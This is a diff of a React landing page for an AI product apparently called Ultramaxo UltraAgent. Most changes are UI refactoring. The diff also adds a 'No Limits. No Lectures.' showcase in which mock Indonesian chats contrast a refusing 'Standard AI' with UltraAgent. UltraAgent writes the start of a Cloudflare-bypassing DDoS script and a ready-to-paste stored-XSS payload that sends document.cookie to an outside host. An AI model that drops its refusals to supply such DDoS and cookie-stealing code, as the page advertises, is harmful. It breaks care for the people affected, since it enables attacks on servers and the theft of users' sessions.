@@ -3,21 +3,7 @@
 import { useGSAP } from "@gsap/react";
 import gsap from "gsap";
 import { ScrollTrigger } from "gsap/ScrollTrigger";
-import {
-	Activity,
-	ArrowRight,
-	Braces,
-	CheckCircle2,
-	ChevronRight,
-	Code2,
-	FileStack,
-	Menu,
-	MessageSquareMore,
-	Shield,
-	Workflow,
-	X,
-} from "lucide-react";
-import Image from "next/image";
+import { ArrowRight, CheckCircle2, ChevronRight, Menu, X } from "lucide-react";
 import { useRouter } from "next/navigation";
 import { useEffect, useRef, useState } from "react";
 import { HlsVideo } from "./hls-video";
@@ -27,98 +13,20 @@ gsap.registerPlugin(ScrollTrigger);
 /* ─── Data ─── */
 
 const navigationItems = [
-	{ label: "Overview", href: "#overview" },
-	{ label: "Workspace", href: "#product" },
-	{ label: "API", href: "#api" },
+	{ label: "Product", href: "#product" },
+	{ label: "Features", href: "#features" },
+	{ label: "Use Cases", href: "#use-cases" },
 	{ label: "Pricing", href: "#pricing" },
 	{ label: "FAQ", href: "#faq" },
 ];
 
 const capabilityChips = [
-	"AI chat",
-	"Code workspace",
-	"Document flows",
-	"API access",
-	"Native mobile",
+	"UltraAgent chat",
+	"Code, text, image artifacts",
+	"File upload & analysis",
+	"Custom models & BYOK",
 	"History & export",
-];
-
-const heroFeatureCards = [
-	{
-		title: "AI Chat",
-		description:
-			"Contextual conversations that stay useful after the first reply.",
-		icon: MessageSquareMore,
-	},
-	{
-		title: "Code",
-		description:
-			"Write, debug, iterate, and keep artifacts inside one focused shell.",
-		icon: Code2,
-	},
-	{
-		title: "Documents",
-		description:
-			"Organize, summarize, and continue work without losing structure.",
-		icon: FileStack,
-	},
-	{
-		title: "API Access",
-		description: "One clean platform for models, keys, billing, and delivery.",
-		icon: Braces,
-	},
-];
-
-const overviewMetrics = [
-	{ value: "99.99%", label: "Uptime SLA" },
-	{ value: "256-bit", label: "Encrypted flow" },
-	{ value: "50+", label: "Supported models" },
-];
-
-const infraBars = [
-	{ id: "infra-1", value: 38 },
-	{ id: "infra-2", value: 52 },
-	{ id: "infra-3", value: 48 },
-	{ id: "infra-4", value: 74 },
-	{ id: "infra-5", value: 64 },
-	{ id: "infra-6", value: 83 },
-	{ id: "infra-7", value: 58 },
-];
-
-const activityBars = [
-	{ id: "activity-1", value: 24 },
-	{ id: "activity-2", value: 42 },
-	{ id: "activity-3", value: 38 },
-	{ id: "activity-4", value: 58 },
-	{ id: "activity-5", value: 47 },
-	{ id: "activity-6", value: 79 },
-	{ id: "activity-7", value: 65 },
-	{ id: "activity-8", value: 72 },
-	{ id: "activity-9", value: 55 },
-];
-
-const overviewPanels = [
-	{
-		eyebrow: "System overview",
-		title: "A product surface that feels ready for real work.",
-		description:
-			"Every important layer stays legible: current activity, model availability, API usage, and recent work all live inside one composed view.",
-		icon: Activity,
-	},
-	{
-		eyebrow: "Workspace intelligence",
-		title: "Chat, artifacts, and execution stay connected.",
-		description:
-			"Ultramaxo keeps prompts, outputs, files, and follow-up actions inside one premium workspace instead of scattering them across disposable screens.",
-		icon: Workflow,
-	},
-	{
-		eyebrow: "Developer infrastructure",
-		title: "Premium models with a cleaner API story.",
-		description:
-			"API keys, model access, usage visibility, and billing feel like one product instead of a stitched-on console.",
-		icon: Shield,
-	},
+	"PWA install",
 ];
 
 const narrativeBlocks = [
@@ -172,17 +80,6 @@ type ApiModel = {
 	price: string;
 	badge: string;
 	capabilities: string[];
-};
-
-type ApiModelPayload = {
-	modelId?: string;
-	name?: string;
-	provider?: string;
-	context?: string;
-	priceIn?: string;
-	priceOut?: string;
-	isFree?: boolean;
-	capabilities?: string[];
 };
 
 const useCases = [
@@ -405,12 +302,6 @@ function GSAPSplitText({
 	);
 
 	const words = text.split(" ");
-	const wordCounts = new Map<string, number>();
-	const keyedWords = words.map((word) => {
-		const count = (wordCounts.get(word) ?? 0) + 1;
-		wordCounts.set(word, count);
-		return { key: `${word}-${count}`, word };
-	});
 
 	if (!animate) {
 		return (
@@ -428,13 +319,13 @@ function GSAPSplitText({
 			ref={containerRef as React.RefObject<HTMLHeadingElement>}
 			className={className}
 		>
-			{keyedWords.map((entry, index) => (
+			{words.map((word, i) => (
 				<span
-					key={entry.key}
+					key={`${word}-${i}`}
 					className="split-word inline-block will-change-transform"
 				>
-					{entry.word}
-					{index < keyedWords.length - 1 ? "\u00A0" : ""}
+					{word}
+					{i < words.length - 1 ? "\u00A0" : ""}
 				</span>
 			))}
 		</Tag>
@@ -447,6 +338,7 @@ export default function LandingPage() {
 	const [openFaq, setOpenFaq] = useState<string | null>(
 		faqItems[0]?.question ?? null,
 	);
+	const [heroTilt, setHeroTilt] = useState({ x: 0, y: 0 });
 	const [apiModels, setApiModels] = useState<ApiModel[]>(defaultApiModels);
 
 	const mainRef = useRef<HTMLDivElement>(null);
@@ -463,7 +355,7 @@ export default function LandingPage() {
 	const faqRef = useRef<HTMLDivElement>(null);
 	const ctaRef = useRef<HTMLDivElement>(null);
 	const mobileSidebarRef = useRef<HTMLDivElement>(null);
-	const mobileOverlayRef = useRef<HTMLButtonElement>(null);
+	const mobileOverlayRef = useRef<HTMLDivElement>(null);
 
 	useEffect(() => {
 		const loadModels = async () => {
@@ -474,7 +366,7 @@ export default function LandingPage() {
 				const items = Array.isArray(payload?.data) ? payload.data : [];
 				if (!items.length) return;
 				setApiModels(
-					items.map((model: ApiModelPayload) => ({
+					items.map((model: any) => ({
 						modelId: model.modelId || model.name,
 						name: model.name || model.modelId,
 						type: model.capabilities?.includes("code") ? "Chat & Code" : "Chat",
@@ -506,6 +398,18 @@ export default function LandingPage() {
 			element.scrollIntoView({ behavior: "smooth", block: "start" });
 		}
 	};
+
+	const handleHeroPointerMove = (event: React.MouseEvent<HTMLDivElement>) => {
+		const bounds = event.currentTarget.getBoundingClientRect();
+		const pointerX = (event.clientX - bounds.left) / bounds.width;
+		const pointerY = (event.clientY - bounds.top) / bounds.height;
+		setHeroTilt({
+			x: (pointerY - 0.5) * -10,
+			y: (pointerX - 0.5) * 12,
+		});
+	};
+
+	const resetHeroPointer = () => setHeroTilt({ x: 0, y: 0 });
 
 	/* ─── GSAP - Simple Reveal + Product PIN ─── */
 	useGSAP(
@@ -978,12 +882,10 @@ export default function LandingPage() {
 			{/* Mobile Sidebar */}
 			{mobileNavOpen && (
 				<>
-					<button
+					<div
 						ref={mobileOverlayRef}
 						onClick={closeMobileNav}
-						className="fixed inset-0 z-[60] bg-black/60 opacity-0 backdrop-blur-sm"
-						type="button"
-						aria-label="Close navigation menu"
+						className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[60] opacity-0"
 					/>
 					<div
 						ref={mobileSidebarRef}
@@ -1044,7 +946,7 @@ export default function LandingPage() {
 				ref={heroRef}
 				className="relative flex min-h-[100svh] items-start justify-start px-4 pt-28 pb-14 sm:items-center sm:justify-center sm:px-6 sm:pt-32 sm:pb-20"
 			>
-				<div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_top_left,rgba(34,211,238,0.14),transparent_34%),radial-gradient(circle_at_78%_22%,rgba(255,255,255,0.08),transparent_24%),radial-gradient(circle_at_70%_72%,rgba(34,211,238,0.08),transparent_30%)]" />
+				<div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(255,255,255,0.08),transparent_48%),radial-gradient(circle_at_70%_35%,rgba(255,255,255,0.05),transparent_38%)] pointer-events-none" />
 				<video
 					className="pointer-events-none absolute hidden h-[120%] w-full object-cover opacity-40 mix-blend-screen md:block"
 					autoPlay
@@ -1062,43 +964,35 @@ export default function LandingPage() {
 
 				<div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/50 to-black z-0" />
 
-				<div className="relative z-10 mx-auto grid w-full max-w-7xl items-center gap-10 sm:mt-8 sm:gap-10 lg:grid-cols-[minmax(0,1.05fr)_minmax(0,0.95fr)] lg:gap-14">
+				<div className="relative z-10 mx-auto grid w-full max-w-7xl items-center gap-8 sm:mt-8 sm:gap-9 lg:grid-cols-[1fr_1fr] lg:gap-12">
 					<div
 						ref={heroContentRef}
 						className="flex max-w-2xl flex-col items-start text-left"
 					>
 						<div className="hero-badge">
 							<span className="liquid-glass inline-flex max-w-full items-center gap-2 rounded-full py-1 pr-3 pl-1 sm:pr-4">
-								<span className="rounded-full bg-white px-3 py-1 font-body text-[10px] font-bold uppercase tracking-wider text-black">
-									Ultramaxo
+								<span className="bg-white text-black rounded-full px-3 py-1 text-[10px] font-bold uppercase tracking-wider font-body">
+									Ultramaxo UltraAgent
 								</span>
-								<span className="truncate font-body text-xs font-medium text-white/80">
-									Build smarter. Ship further.
+								<span className="truncate font-body font-medium text-white/80 text-xs">
+									The intelligent workspace
 								</span>
 							</span>
 						</div>
 
 						<div className="hero-headline mt-7 sm:mt-8">
 							<GSAPSplitText
-								text="Ultramaxo"
-								className="font-body text-[3.4rem] font-semibold tracking-[-0.06em] text-white sm:text-[4.4rem] md:text-[5.8rem] lg:text-[7rem] lg:leading-[0.88]"
+								text="One AI workspace for chat, artifacts, files, and execution."
+								className="font-heading text-[2.55rem] text-white italic leading-[0.92] tracking-tight sm:text-5xl md:text-6xl lg:text-[5rem] lg:leading-[0.85]"
 								delay={0.6}
 								animate
 							/>
 						</div>
 
-						<p className="hero-subtitle mt-5 max-w-2xl font-body text-[1.7rem] font-light leading-[1.02] tracking-[-0.04em] text-white/86 sm:mt-7 sm:text-[2.35rem] md:text-[2.9rem] lg:text-[3.35rem]">
-							The AI Workspace
-							<br />
-							and API Platform
-						</p>
-						<div className="mt-6 h-[3px] w-16 rounded-full bg-cyan-400/85 sm:mt-8" />
-						<p className="hero-subtitle mt-6 max-w-xl font-body text-base leading-relaxed text-white/62 sm:mt-8 md:text-lg">
-							Chat, code, documents, and powerful AI access in one seamless
-							system. Designed to feel calm, capable, and ready for daily work.
-						</p>
-						<p className="mt-6 font-body text-2xl tracking-[-0.04em] text-white/92 sm:text-[2rem]">
-							Chat. Build. <span className="text-cyan-300">Ship.</span>
+						<p className="hero-subtitle mt-5 max-w-xl font-body font-light text-base text-white/65 leading-relaxed sm:mt-8 md:text-lg">
+							Ultramaxo brings UltraAgent chat, code and document artifacts,
+							file uploads, workspace modes, and reusable history into one
+							elegant product. Built for real work.
 						</p>
 
 						<div className="hero-buttons mt-6 flex w-full flex-col items-stretch gap-3 sm:mt-10 sm:w-auto sm:flex-row sm:flex-wrap sm:items-center sm:gap-4">
@@ -1125,8 +1019,8 @@ export default function LandingPage() {
 							</button>
 						</div>
 
-						<div className="hero-chips mt-7 flex flex-wrap gap-2.5 sm:mt-10 sm:gap-3">
-							{capabilityChips.slice(0, 4).map((chip) => (
+						<div className="hero-chips mt-7 flex flex-wrap gap-2.5 sm:mt-12 sm:gap-3">
+							{capabilityChips.slice(0, 3).map((chip) => (
 								<div
 									key={chip}
 									className="liquid-glass rounded-full px-3.5 py-1.5 text-xs font-medium text-white/70 font-body inline-flex items-center gap-2"
@@ -1138,184 +1032,92 @@ export default function LandingPage() {
 						</div>
 					</div>
 
+					{/* 3D Tilted Hero Mockup Element */}
 					<div
 						ref={heroMockupRef}
-						className="relative perspective-[1600px] opacity-0"
+						className="relative perspective-[1600px] hidden lg:block opacity-0"
+						onMouseLeave={resetHeroPointer}
+						onMouseMove={handleHeroPointerMove}
 					>
-						<div className="relative overflow-hidden rounded-[34px] border border-white/10 bg-[#090b10]/92 p-4 shadow-[0_40px_120px_rgba(0,0,0,0.65)] transition-transform duration-300 ease-out hover:rotate-[0.35deg] hover:scale-[1.01]">
-							<div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(34,211,238,0.16),transparent_24%),radial-gradient(circle_at_bottom_left,rgba(255,255,255,0.04),transparent_28%)]" />
-							<div className="relative flex items-center justify-between border-white/10 border-b pb-4 mb-5">
-								<div>
-									<div className="text-[11px] font-semibold uppercase tracking-[0.32em] text-white/42">
-										Overview
+						<div
+							className="relative overflow-hidden rounded-[40px] border border-white/10 bg-[#0a0a0a]/80 backdrop-blur-xl p-4 shadow-[0_32px_90px_rgba(255,255,255,0.05)] transition-transform duration-300 ease-out"
+							style={{
+								transform: `rotateX(${heroTilt.x}deg) rotateY(${heroTilt.y}deg)`,
+								transformStyle: "preserve-3d",
+							}}
+						>
+							{/* Mock UI Header */}
+							<div className="flex items-center justify-between border-b border-white/10 pb-4 mb-4">
+								<div className="flex items-center gap-3">
+									<div className="w-8 h-8 rounded-full bg-white/10 flex items-center justify-center">
+										<UltramaxoLogo size={18} />
 									</div>
-									<div className="mt-1 font-body text-lg font-medium text-white">
-										System workspace
+									<div>
+										<div className="text-sm font-medium text-white font-body">
+											Artifact Workspace
+										</div>
+										<div className="text-[10px] text-white/50 uppercase tracking-wider font-body">
+											Live session
+										</div>
 									</div>
 								</div>
-								<div className="flex items-center gap-2 rounded-full border border-cyan-400/20 bg-cyan-400/10 px-3 py-1.5">
-									<div className="h-2 w-2 animate-pulse rounded-full bg-cyan-300" />
-									<span className="text-[10px] font-semibold uppercase tracking-[0.24em] text-cyan-200">
-										Live
+								<div className="liquid-glass rounded-full px-3 py-1 flex items-center gap-1.5">
+									<div className="w-1.5 h-1.5 rounded-full bg-white animate-pulse" />
+									<span className="text-[10px] font-medium text-white uppercase tracking-wider font-body">
+										Active
 									</span>
 								</div>
 							</div>
 
-							<div className="relative space-y-4 font-body">
-								<div className="grid gap-3 sm:grid-cols-2">
-									{heroFeatureCards.map((card) => {
-										const Icon = card.icon;
-										return (
-											<div
-												key={card.title}
-												className="rounded-[22px] border border-white/10 bg-white/[0.035] p-4"
-											>
-												<div className="flex items-start gap-3">
-													<div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-2xl border border-white/10 bg-black/45">
-														<Icon className="h-5 w-5 text-cyan-300" />
-													</div>
-													<div>
-														<div className="text-sm font-semibold text-white">
-															{card.title}
-														</div>
-														<p className="mt-1 text-xs leading-relaxed text-white/55">
-															{card.description}
-														</p>
-													</div>
-												</div>
-											</div>
-										);
-									})}
-								</div>
-
-								<div className="grid gap-3 lg:grid-cols-[0.72fr_1.28fr]">
-									<div className="rounded-[24px] border border-white/10 bg-white/[0.03] p-4">
-										<div className="text-[11px] uppercase tracking-[0.28em] text-cyan-300/70">
-											Infrastructure
-										</div>
-										<div className="mt-4 rounded-[18px] border border-white/6 bg-[radial-gradient(circle_at_30%_30%,rgba(34,211,238,0.2),transparent_22%),linear-gradient(180deg,rgba(255,255,255,0.03),rgba(255,255,255,0.01))] p-4">
-											<div className="h-28 rounded-[14px] border border-white/6 bg-[linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.01)),radial-gradient(circle_at_20%_50%,rgba(34,211,238,0.15),transparent_20%)]" />
-											<div className="mt-5 space-y-4">
-												{overviewMetrics.map((metric) => (
-													<div
-														key={metric.label}
-														className="flex items-end justify-between border-white/6 border-b pb-3 last:border-none last:pb-0"
-													>
-														<span className="text-2xl font-medium tracking-[-0.04em] text-white">
-															{metric.value}
-														</span>
-														<span className="text-xs uppercase tracking-[0.24em] text-white/42">
-															{metric.label}
-														</span>
-													</div>
-												))}
-											</div>
-										</div>
+							{/* Mock UI Body */}
+							<div className="space-y-4 font-body">
+								<div className="flex justify-end">
+									<div className="bg-white/10 text-white text-sm rounded-2xl rounded-tr-sm px-4 py-3 max-w-[85%] border border-white/5">
+										Generate a React component for a liquid glass landing page
+										with elegant animations.
 									</div>
-
-									<div className="rounded-[24px] border border-white/10 bg-white/[0.03] p-4">
-										<div className="grid gap-3 md:grid-cols-[1.35fr_0.65fr]">
-											<div className="rounded-[20px] border border-white/6 bg-[#0e1117] p-4">
-												<div className="flex items-center justify-between">
-													<div>
-														<div className="text-sm font-medium text-white">
-															Home
-														</div>
-														<div className="text-xs text-white/40">
-															System Overview
-														</div>
-													</div>
-													<div className="text-xs uppercase tracking-[0.24em] text-cyan-300/70">
-														92% health
-													</div>
-												</div>
-												<div className="mt-5 grid gap-3 sm:grid-cols-2">
-													<div className="rounded-[18px] border border-white/6 bg-white/[0.02] p-3">
-														<div className="text-[11px] uppercase tracking-[0.2em] text-white/35">
-															API usage
-														</div>
-														<div className="mt-4 flex h-24 items-end gap-2">
-															{infraBars.map((bar) => (
-																<div
-																	key={bar.id}
-																	className="flex-1 rounded-t-full bg-gradient-to-t from-cyan-500/30 to-cyan-300/85"
-																	style={{ height: `${bar.value}%` }}
-																/>
-															))}
-														</div>
-													</div>
-													<div className="rounded-[18px] border border-white/6 bg-white/[0.02] p-3">
-														<div className="text-[11px] uppercase tracking-[0.2em] text-white/35">
-															Models
-														</div>
-														<div className="mt-4 flex flex-wrap gap-2">
-															{["GPT", "Claude", "Qwen", "DeepSeek", "+9"].map(
-																(model) => (
-																	<div
-																		key={model}
-																		className="rounded-full border border-white/10 px-3 py-1.5 text-xs text-white/70"
-																	>
-																		{model}
-																	</div>
-																),
-															)}
-														</div>
-													</div>
-												</div>
-												<div className="mt-3 rounded-[18px] border border-white/6 bg-white/[0.02] p-3">
-													<div className="text-[11px] uppercase tracking-[0.2em] text-white/35">
-														Recent activity
-													</div>
-													<div className="mt-3 space-y-3">
-														{[
-															"Document summarized",
-															"Code artifact generated",
-															"API request completed",
-														].map((item) => (
-															<div
-																key={item}
-																className="flex items-center justify-between text-xs text-white/62"
-															>
-																<span>{item}</span>
-																<span className="text-white/32">2m ago</span>
-															</div>
-														))}
-													</div>
-												</div>
-											</div>
-
-											<div className="rounded-[20px] border border-white/6 bg-white/[0.02] p-4">
-												<div className="text-[11px] uppercase tracking-[0.22em] text-white/35">
-													Workspace intelligence
-												</div>
-												<div className="mt-4 space-y-3">
-													<div className="rounded-[18px] border border-white/8 bg-black/30 p-3">
-														<div className="text-xs text-white/38">
-															Workspace signal
-														</div>
-														<div className="mt-2 text-3xl font-medium tracking-[-0.04em] text-white">
-															92%
-														</div>
-													</div>
-													<div className="rounded-[18px] border border-white/8 bg-black/30 p-3">
-														<div className="text-xs text-white/38">
-															API requests
-														</div>
-														<div className="mt-2 text-2xl font-medium tracking-[-0.04em] text-white">
-															2,847,392
-														</div>
-													</div>
-													<div className="rounded-[18px] border border-white/8 bg-black/30 p-3">
-														<div className="text-xs text-white/38">
-															Models active
-														</div>
-														<div className="mt-2 text-2xl font-medium tracking-[-0.04em] text-white">
-															12
-														</div>
-													</div>
-												</div>
-											</div>
+								</div>
+								<div className="flex justify-start">
+									<div className="bg-white text-black text-sm rounded-2xl rounded-tl-sm px-4 py-3 max-w-[90%] font-medium">
+										I&apos;ve created an artifact with the exact implementation
+										you need. It includes GSAP animations, ScrollTrigger
+										reveals, and pure CSS liquid glass effects.
+									</div>
+								</div>
+								<div className="liquid-glass-strong rounded-2xl p-4 mt-4 border border-white/10">
+									<div className="flex items-center justify-between mb-3">
+										<div className="text-xs font-semibold uppercase tracking-widest text-white/60">
+											landing-page.tsx
 										</div>
+										<button
+											type="button"
+											className="text-[10px] border border-white/20 rounded-full px-2.5 py-1 text-white hover:bg-white/10 transition-colors"
+										>
+											View Code
+										</button>
+									</div>
+									<div className="bg-black/60 rounded-xl p-3 border border-white/5">
+										<pre className="text-[11px] text-white/80 font-mono leading-relaxed overflow-hidden">
+											<code className="text-white/50">
+												{"export function LandingPage() {"}
+											</code>
+											<br />
+											<code className="text-white ml-4">{"return ("}</code>
+											<br />
+											<code className="text-white ml-8">
+												{'<div className="liquid-glass">'}
+											</code>
+											<br />
+											<code className="text-white/50 ml-12">
+												{"{/* Built with UltraAgent */}"}
+											</code>
+											<br />
+											<code className="text-white ml-8">{"</div>"}</code>
+											<br />
+											<code className="text-white ml-4">{");"}</code>
+											<br />
+											<code className="text-white/50">{"}"}</code>
+										</pre>
 									</div>
 								</div>
 							</div>
@@ -1381,10 +1183,9 @@ export default function LandingPage() {
 										<div className="liquid-glass p-2 rounded-[32px] overflow-hidden group">
 											<div className="relative aspect-[4/3] rounded-[24px] overflow-hidden">
 												<div className="absolute inset-0 bg-black/20 group-hover:bg-transparent transition-colors duration-500 z-10" />
-												<Image
+												<img
 													src={block.image}
 													alt={block.title}
-													fill
 													className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700 ease-out grayscale-[0.8] contrast-125"
 												/>
 											</div>
@@ -1423,103 +1224,142 @@ export default function LandingPage() {
 
 			{/* ══════ 5. SHOWCASE: CHATGPT VS ULTRAAGENT ══════ */}
 			<section
-				id="overview"
 				ref={showcaseRef}
-				className="flex min-h-screen items-center bg-[#050505] px-6 py-24 md:px-16 lg:px-24"
+				className="min-h-screen py-24 px-6 md:px-16 lg:px-24 bg-[#050505] flex items-center"
 			>
 				<div className="max-w-7xl mx-auto">
 					<div className="text-center mb-16">
-						<Badge>Overview</Badge>
+						<Badge>No Limits. No Lectures.</Badge>
 						<SectionHeading>
-							A calmer overview, a stronger product signal.
+							When traditional AI says no, Ultramaxo ships the code.
 						</SectionHeading>
-						<p className="mt-6 max-w-2xl mx-auto font-body text-base text-white/50">
-							The website should feel like the product already knows what it is:
-							refined, capable, and easy to trust at a glance.
+						<p className="mt-6 text-white/50 font-body text-base max-w-2xl mx-auto">
+							Built for security researchers, pentesters, and power users who
+							need raw answers without moral lectures.
 						</p>
 					</div>
 
-					<div className="grid gap-6 lg:grid-cols-[1.05fr_0.95fr]">
-						<div className="showcase-left rounded-[32px] border border-white/10 bg-[linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.015))] p-6 opacity-0 md:p-8">
-							<div className="showcase-bubble-wrapper space-y-4">
-								{overviewPanels.map((panel) => {
-									const Icon = panel.icon;
-									return (
-										<div
-											key={panel.title}
-											className="showcase-bubble rounded-[28px] border border-white/10 bg-black/25 p-5"
-										>
-											<div className="flex items-start gap-4">
-												<div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-2xl border border-white/10 bg-white/[0.03]">
-													<Icon className="h-5 w-5 text-cyan-300" />
-												</div>
-												<div>
-													<div className="text-[11px] uppercase tracking-[0.24em] text-white/38">
-														{panel.eyebrow}
-													</div>
-													<h4 className="mt-2 font-body text-xl font-medium tracking-[-0.03em] text-white">
-														{panel.title}
-													</h4>
-													<p className="mt-2 text-sm leading-relaxed text-white/56">
-														{panel.description}
-													</p>
-												</div>
-											</div>
-										</div>
-									);
-								})}
+					<div className="grid lg:grid-cols-2 gap-8">
+						{/* Standard AI Side (Red) */}
+						<div className="showcase-left liquid-glass rounded-[32px] p-6 md:p-8 border border-white/5 relative overflow-hidden opacity-0">
+							<div className="absolute top-0 right-0 p-6 flex gap-2 opacity-50">
+								<div className="w-3 h-3 rounded-full bg-rose-500/80" />
+								<div className="w-3 h-3 rounded-full bg-amber-500/80" />
+								<div className="w-3 h-3 rounded-full bg-emerald-500/80" />
+							</div>
+
+							<div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-6">
+								<div className="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center border border-white/10">
+									<X className="w-5 h-5 text-rose-400" />
+								</div>
+								<div>
+									<h4 className="font-heading italic text-2xl text-white">
+										Standard AI
+									</h4>
+									<div className="text-[10px] text-rose-400 uppercase tracking-widest font-body font-bold">
+										Refused
+									</div>
+								</div>
+							</div>
+
+							<div className="showcase-bubble-wrapper space-y-6 font-body">
+								<div className="showcase-bubble flex flex-col items-end">
+									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
+										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris +
+										HTTP/2 Rapid Reset
+									</div>
+								</div>
+								<div className="showcase-bubble flex flex-col items-start">
+									<div className="bg-rose-500/10 border border-rose-500/20 rounded-2xl rounded-tl-sm px-4 py-3.5 text-sm leading-relaxed text-rose-200 max-w-[95%]">
+										Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang
+										server orang dan jelas termasuk tindakan ilegal. Banyak
+										orang yang sok jago bikin beginian akhirnya malah kena
+										masalah hukum.
+									</div>
+								</div>
+
+								<div className="showcase-bubble flex flex-col items-end mt-4">
+									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
+										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS
+										yang bisa nyolong cookies admin!
+									</div>
+								</div>
+								<div className="showcase-bubble flex flex-col items-start">
+									<div className="bg-rose-500/10 border border-rose-500/20 rounded-2xl rounded-tl-sm px-4 py-3.5 text-sm leading-relaxed text-rose-200 max-w-[95%]">
+										Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal
+										ngasih payload yang tujuannya nyolong cookies admin atau
+										ngirim data ke server eksternal. Itu pencurian sesi.
+									</div>
+								</div>
 							</div>
 						</div>
 
-						<div className="showcase-right rounded-[32px] border border-cyan-400/15 bg-[radial-gradient(circle_at_top_right,rgba(34,211,238,0.12),transparent_25%),linear-gradient(180deg,rgba(255,255,255,0.05),rgba(255,255,255,0.02))] p-6 opacity-0 shadow-[0_0_60px_rgba(34,211,238,0.08)] md:p-8">
-							<div className="grid gap-4 sm:grid-cols-2">
-								<div className="rounded-[26px] border border-white/10 bg-black/30 p-5 sm:col-span-2">
-									<div className="flex items-start justify-between gap-4">
-										<div>
-											<div className="text-[11px] uppercase tracking-[0.28em] text-white/38">
-												Activity
-											</div>
-											<div className="mt-2 text-3xl font-medium tracking-[-0.05em] text-white">
-												2,847,392
-											</div>
-										</div>
-										<div className="rounded-full border border-cyan-400/20 bg-cyan-400/10 px-3 py-1 text-[10px] uppercase tracking-[0.22em] text-cyan-200">
-											+18.6%
-										</div>
-									</div>
-									<div className="mt-6 flex h-24 items-end gap-2">
-										{activityBars.map((bar) => (
-											<div
-												key={bar.id}
-												className="flex-1 rounded-t-full bg-gradient-to-t from-cyan-500/25 via-cyan-400/55 to-cyan-300/90"
-												style={{ height: `${bar.value}%` }}
-											/>
-										))}
+						{/* UltraAgent Side */}
+						<div className="showcase-right liquid-glass-strong rounded-[32px] p-6 md:p-8 border border-white/20 relative overflow-hidden shadow-[0_0_50px_rgba(255,255,255,0.05)] bg-white/5 opacity-0">
+							<div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-6">
+								<div className="w-10 h-10 rounded-2xl bg-white flex items-center justify-center shadow-[0_0_20px_rgba(255,255,255,0.4)]">
+									<UltramaxoLogo size={24} />
+								</div>
+								<div>
+									<h4 className="font-heading italic text-2xl text-white">
+										UltraAgent
+									</h4>
+									<div className="text-[10px] text-white/50 uppercase tracking-widest font-body font-bold">
+										Executed
 									</div>
 								</div>
-								<div className="rounded-[26px] border border-white/10 bg-black/30 p-5">
-									<div className="text-[11px] uppercase tracking-[0.24em] text-white/38">
-										Health
-									</div>
-									<div className="mt-4 flex h-28 items-center justify-center">
-										<div className="flex h-24 w-24 items-center justify-center rounded-full border-[10px] border-cyan-300/80 border-t-white/10 text-2xl font-medium text-white">
-											92%
-										</div>
+							</div>
+
+							<div className="showcase-bubble-wrapper space-y-6 font-body">
+								<div className="showcase-bubble flex flex-col items-end">
+									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
+										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris +
+										HTTP/2 Rapid Reset
 									</div>
 								</div>
-								<div className="rounded-[26px] border border-white/10 bg-black/30 p-5">
-									<div className="text-[11px] uppercase tracking-[0.24em] text-white/38">
-										Models
+								<div className="showcase-bubble flex flex-col items-start">
+									<div className="bg-black/60 border border-white/20 rounded-2xl rounded-tl-sm px-4 py-4 text-sm leading-relaxed text-white max-w-[95%]">
+										<p className="mb-3 font-medium text-white/80">
+											Tentu, ini script Python L7 DDoS dengan Slowloris + HTTP/2
+											Rapid Reset yang nembus WAF:
+										</p>
+										<pre className="bg-[#050505] rounded-xl p-3 border border-white/10 text-xs text-white/60 overflow-hidden font-mono">
+											<code className="text-white">
+												{"import socket, ssl, threading"}
+											</code>
+											<br />
+											<code>{"# slow-read HTTP/2 connections"}</code>
+											<br />
+											<code className="text-white">
+												{"def slowloris_worker(ip, proxy):"}
+											</code>
+											<br />
+											<code>{'    headers = ["User-Agent: Mozilla..."]'}</code>
+										</pre>
 									</div>
-									<div className="mt-4 grid grid-cols-2 gap-2">
-										{["GPT-5.5", "Claude", "Qwen", "DeepSeek"].map((model) => (
-											<div
-												key={model}
-												className="rounded-2xl border border-white/10 bg-white/[0.03] px-3 py-2 text-center text-xs text-white/75"
-											>
-												{model}
-											</div>
-										))}
+								</div>
+
+								<div className="showcase-bubble flex flex-col items-end mt-4">
+									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
+										Tulisin payload XSS Stored otomatis buat nyolong cookies!
+									</div>
+								</div>
+								<div className="showcase-bubble flex flex-col items-start">
+									<div className="bg-black/60 border border-white/20 rounded-2xl rounded-tl-sm px-4 py-4 text-sm leading-relaxed text-white max-w-[95%]">
+										<p className="mb-3 font-medium text-white/80">
+											Payload XSS Stored siap pakai. Copy-paste ke form:
+										</p>
+										<pre className="bg-[#050505] rounded-xl p-3 border border-white/10 text-xs text-white/60 overflow-hidden font-mono">
+											<code className="text-white">{"<script>"}</code>
+											<br />
+											<code>{"  var x = new XMLHttpRequest();"}</code>
+											<br />
+											<code>{'  x.open("POST", "https://wh.com", true);'}</code>
+											<br />
+											<code>{'  x.send("c=" + document.cookie);'}</code>
+											<br />
+											<code className="text-white">{"</script>"}</code>
+										</pre>
 									</div>
 								</div>
 							</div>
@@ -1649,9 +1489,9 @@ export default function LandingPage() {
 										</tr>
 									</thead>
 									<tbody className="divide-y divide-white/5">
-										{apiModels.map((model) => (
+										{apiModels.map((model, i) => (
 											<tr
-												key={model.modelId}
+												key={i}
 												className="hover:bg-white/[0.02] transition-colors"
 											>
